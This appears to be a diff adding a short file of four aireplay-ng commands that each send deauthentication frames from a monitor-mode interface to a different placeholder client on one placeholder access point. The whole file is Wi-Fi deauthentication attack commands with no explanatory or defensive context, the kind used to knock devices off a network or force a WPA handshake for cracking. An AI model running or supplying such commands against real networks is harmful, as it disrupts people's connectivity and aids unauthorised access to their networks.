@@ -1,0 +1,7 @@
+aireplay-ng -0 2 -c C1:C1:C1:C1:C1:C1 -a AP:AP:AP:AP:AP:AP wlan0mon
+                        
+aireplay-ng -0 2 -c C2:C2:C2:C2:C2:C2 -a AP:AP:AP:AP:AP:AP wlan0mon
+                        
+aireplay-ng -0 2 -c C3:C3:C3:C3:C3:C3 -a AP:AP:AP:AP:AP:AP wlan0mon
+                        
+aireplay-ng -0 2 -c C4:C4:C4:C4:C4:C4 -a AP:AP:AP:AP:AP:AP wlan0mon
